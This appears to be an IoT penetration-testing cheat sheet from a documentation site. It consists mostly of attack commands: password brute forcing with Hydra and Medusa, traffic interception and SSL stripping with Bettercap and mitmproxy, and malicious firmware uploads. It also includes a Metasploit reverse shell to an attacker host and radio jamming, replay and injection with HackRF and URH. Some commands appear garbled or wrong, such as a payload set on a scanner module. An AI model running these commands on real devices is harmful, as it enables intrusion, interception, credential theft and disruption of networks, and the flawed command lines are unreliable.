---
title: IOT
sidebar: mydoc_sidebar
permalink: iot.html
folder: mydoc
---

## Enumeration

To scan all open ports and services running on them

```
nmap -Pn -sS -sV <target IP> -p 1-65535
```

To enumerate directories and files on the web server.

```
dirb http://<target IP>:<port>/
```

To enumerate SNMP service.

```
snmpwalk -c public -v1 <target IP>
```


## http

Use curl to send HTTP requests:

```
curl -X GET http://target.com/
curl -X POST -d "data=example" http://target.com/
```

Use wget to download files:

```
wget http://target.com/file
```

Use Nikto for web server scanning:

```
nikto -h target.com
```

## MQTT

Use Mosquitto to publish and subscribe to topics:

```
mosquitto_sub -t topic -h broker_address -p port -u username -P password
mosquitto_pub -t topic -h broker_address -p port -m "message" -u username -P password
```

Use MQTTInspector to capture and analyze MQTT traffic:

```
https://github.com/dustinbrunton/MQTTInspector
```

## CoAP


Use CoAPthon3 for sending CoAP requests:

```
python3 coapclient.py -m get -u coap://target.com/resource
```

Use Wireshark to capture and analyze CoAP traffic:

```
filter: coap
```

## Zigbee

Use KillerBee to sniff and inject Zigbee traffic:

```
sudo python3 -m pip install pyusb
sudo apt-get install libpcap-dev
sudo python3 -m pip install pyserial
sudo python3 -m pip install pycrypto
sudo python3 -m pip install killerbee
kb
```


Use Wireshark to capture and analyze Zigbee traffic:


```
filter: zbee
```

## Bluetooth Low Energy (BLE)

Use BlueZ to scan and connect to BLE devices:

```
sudo hcitool lescan
sudo hcitool lecc <mac_address>
```

Use GATTacker to fuzz BLE services:

```
https://github.com/securing/gattacker
```

Use Wireshark to capture and analyze BLE traffic:

```
filter: btatt
```

## Weak Guessable, or Hardcoded Passwords

```
hydra -L usernames.txt -P passwords.txt ssh://192.168.0.1
```

or

```
medusa -u admin -P /usr/share/wordlists/rockyou.txt -h 192.168.0.1 -M ssh
```

## Insecure Network Services


```
hydra -L userlist.txt -P passlist.txt -e ns -t 16 telnet://target_IP
```


## Insecure Ecosystem Interfaces


This command instructs Bettercap to start intercepting traffic between two devices with IP addresses 192.168.0.10 and 192.168.0.20, and to perform a TCP proxy for HTTP and HTTPS traffic. The -X option enables SSL stripping, which downgrades HTTPS connections to HTTP, making the traffic vulnerable to interception and manipulation.


```
sudo bettercap --proxy --sniffer -T 192.168.0.10,192.168.0.20 -X --tcp-proxy
```


## Lack of Secure Update Mechanism

Exploiting Unauthenticated Firmware Updates:

```
curl -F "file=@malicious_firmware.bin" http://target_device/update
```

Man-in-the-Middle Attack:

```
arpspoof -i eth0 -t target_device_ip gateway_ip
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
mitmproxy -p 8080 -T --anticache -s "replace.py malicious_firmware.bin"
```

Fuzzing the Update Mechanism:

```
python3 firmware_fuzzer.py target_device_ip
```


## Use of Insecure or Outdated Components


This command uses the "http_jboss_jmx_invoke" module in Metasploit to scan for a vulnerable JBoss server running on port 8080 of the target device. If the vulnerability is found, the "java/jsp_shell_reverse_tcp" payload is used to establish a reverse shell connection back to the attacker's machine.



```
use auxiliary/scanner/http/http_jboss_jmx_invoke
set RHOSTS <target IP>
set RPORT 8080
set PAYLOAD java/jsp_shell_reverse_tcp
set LHOST <attacker IP>
set LPORT <attacker port>
exploit
```


## Insufficient Privacy Protection


This command captures all network traffic on the device's wireless interface (wlan0) and saves it to a file called capture.pcap. The attacker can then use Wireshark or another network analysis tool to examine the captured traffic for sensitive information, such as login credentials or personal data.



```
sudo tcpdump -i wlan0 -s 0 -w capture.pcap
```

or


This command launches BetterCAP on the device's wireless interface (wlan0) and enables the proxy module, which allows the attacker to intercept and modify network traffic in real-time. The attacker can then use this to capture sensitive information or inject malicious payloads into the network traffic.


```
sudo bettercap -I wlan0 --proxy
```

## Insecure Data Transfer and Storage


In this command, mitmproxy is a popular tool for performing MITM attacks. The --host option tells mitmproxy to intercept traffic to and from the target device, and the -R option specifies the URL of the device's API endpoint. The --ssl-insecure option disables SSL certificate verification, allowing the attacker to intercept encrypted traffic.

The -s option specifies a custom script, extract_sensitive_data.py, that extracts sensitive data from intercepted traffic. This script could use regular expressions or other techniques to search for and extract sensitive data from intercepted requests and responses.

```
mitmproxy -T --host -R https://target_device.com/ --ssl-insecure -s extract_sensitive_data.py
```




## Insecure Default Settings


```
hydra -l admin -P password_list.txt 192.168.1.1 http-post-form "/login.html:user=admin&password=^PASS^:Incorrect password"

```


## Firmware Analysis

```
file <bin>  
strings  
strings -n5 <bin> 
strings -n16 <bin>#longer than 16
strings -tx <bin> #print offsets in hex 
binwalk <bin>  
hexdump -C -n 512 <bin> > hexdump.out  
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

If the binary may be encrypted, check the entropy using binwalk with the following command:


```
binwalk -E <bin>
```

Use the following tools and methods to extract filesystem contents:

```
$ binwalk -ev <bin>
```

Firmware Analysis Comparison Toolkit (FACT )

EmbedOS - Embedded security testing operating system based on Ubuntu 18.04 preloaded with firmware security testing tools. The virtual machine can be downloaded and imported as an OVF file into VirtualBox or VMWare.
https://github.com/scriptingxss/EmbedOS



EMBA - Embedded Analyzer

```
sudo ./emba.sh -f ~/IoTGoat-x86.img.gz -l ~/emba_logs_iotgoat -p ./scan-profiles/default-scan.emba
```


firmware analysis toolkit

```
sudo python3 ./fat.py IoTGoat-rpi-2.img --qemu 2.5.0 
```


## UART Exploitation

UART is often used for debugging and maintenance purposes on IoT devices, but it can also be used to gain access to the device and execute malicious code.

```
screen /dev/ttyUSB0 115200 (connect to UART interface with baud rate of 115200)
cu -l /dev/ttyUSB0 -s 115200 (connect to UART interface with baud rate of 115200)
```

Methods: 

1.Identify UART pins on the device
2.Connect to UART using a USB-to-UART adapter
3.Identify the baud rate and data format
4.Access the device console and execute commands
5.Use reverse engineering techniques to analyze firmware and identify vulnerabilities


## JTAG Exploitation

JTAG is a hardware interface used for testing and debugging integrated circuits. It can also be used to gain access to the firmware and execute malicious code.

```
OpenOCD -f interface/<interface> -f target/<target> (start OpenOCD using interface and target configuration files)
```

Methods:

1.Identify JTAG pins on the device
2.Connect to JTAG using a JTAG adapter and OpenOCD software
3.Identify the JTAG chain and select the target device
4.Read and write memory, execute code, and debug firmware using gdb



## SWD Exploitation:

SWD is a newer, smaller and faster version of JTAG that is often used in ARM-based IoT devices. It can also be used to gain access to the firmware and execute malicious code.


```
OpenOCD -f interface/<interface> -c "transport select swd" -f target/<target> (start OpenOCD using interface and target configuration files)
```

Methods:

1.Identify SWD pins on the device
2.Connect to SWD using a SWD adapter and OpenOCD software
3.Identify the SWD chain and select the target device
4.Read and write memory, execute code, and debug firmware using gdb


## SPI (Serial Peripheral Interface)


1.Determine the SPI configuration (clock, polarity, phase) of the target device using a logic analyzer or oscilloscope.

2.Use a bus pirate or similar tool to sniff SPI traffic between the target device and other devices on the bus.

3.Use a tool like spi-tools or spidev to interact with the SPI bus and send custom commands to the target device.

4.Look for unauthenticated or easily guessable commands that can be sent over the SPI bus to modify device behavior or extract sensitive information.

5.Use fault injection attacks (such as glitching or power analysis) to induce errors in the target device and extract secrets.


## I2C (Inter-Integrated Circuit)


1.Determine the I2C address of the target device using a logic analyzer or oscilloscope.
Use a tool like i2cdetect or i2c-tools to interact with the I2C bus and send custom commands to the target device.

2.Look for unauthenticated or easily guessable commands that can be sent over the I2C bus to modify device behavior or extract sensitive information.

3.Use a tool like Bus Pirate or Shikra to sniff I2C traffic between the target device and other devices on the bus.

4.Use a software-defined radio (SDR) to perform electromagnetic (EM) side-channel attacks and extract secrets.


## Medium Range Radio


Sniffing: Use a software-defined radio (SDR) to capture and analyze radio signals. Popular tools for this include GNU Radio, URH, and Inspectrum.

```
sudo apt-get install gnuradio urh
```

Jamming: Jamming is a denial-of-service attack that sends a high-power signal to interfere with the target device's radio signal. The most common tool for jamming is the HackRF One.


```
sudo apt-get install hackrf
```

Replay attack: This involves capturing a valid signal and replaying it later to mimic a legitimate device.


```
Use GNU Radio to capture and replay the signal. Alternatively, use specialized tools like rtl_433 or Universal Radio Hacker (URH).
```


Packet injection: This involves injecting packets into the radio signal to execute an attack. For this, tools like KillerBee and Scapy can be used.


```
sudo apt-get install killerbee scapy
```

Directional antenna: A directional antenna can be used to target a specific device or area, making it easier to intercept or jam the signal.


```
Buy or rent a directional antenna from a reputable vendor.
```

Frequency hopping: Some IoT devices use frequency hopping to avoid interference. However, this can be exploited by capturing and analyzing the hopping patterns to predict where the device will be next.


```
Use tools like GQRX or Inspectrum to analyze frequency hopping patterns.
```


## LPWAN (Low Power Wide Area Network) 


Sniffing and Decoding: Sniffing and decoding the LPWAN communication using software-defined radios (SDRs) and tools such as:

-	Universal Radio Hacker (URH)
-	HackRF One
-	RTL-SDR

To start sniffing with HackRF One:

```
hackrf_transfer -r filename.bin -f frequency -s sample_rate -g gain
```


To decode captured signals with URH:

```
urh --input-file filename.bin --modulation lora --rate [bandwidth] --frequency [frequency]
```

Replay Attacks: Record and replay the captured packets to trigger events on the IoT device or network.

To transmit the recorded signals with HackRF One:

```
hackrf_transfer -t filename.bin -f frequency -s sample_rate -a 1 -x 40
```

To inject signals into the network with URH: 

```
urh --input-file filename.bin --modulation lora --rate [bandwidth] --frequency [frequency] --tx
```

Jamming Attacks: Generate noise on the LPWAN frequency to disrupt the communication between the IoT device and network.

To transmit noise with HackRF One:

```
hackrf_transfer -t noise.bin -f frequency -s sample_rate -a 1 -x 40
```


To generate random signals with URH:

```
urh --modulation lora --rate [bandwidth] --frequency [frequency] --tx --duration [time_in_seconds] --random-data
```

Interference Attacks: Generate signals on nearby frequencies to cause interference and affect the quality of the LPWAN communication.


To transmit signals on a nearby frequency with HackRF One: 

```
hackrf_transfer -t filename.bin -f [nearby_frequency] -s sample_rate -a 1 -x 40
```

To generate signals on multiple frequencies with URH:

```
urh --modulation lora --rate [bandwidth] --frequency-range [start_frequency] [end_frequency] --tx --duration [time_in_seconds] --random-data
```






{% include links.html %}
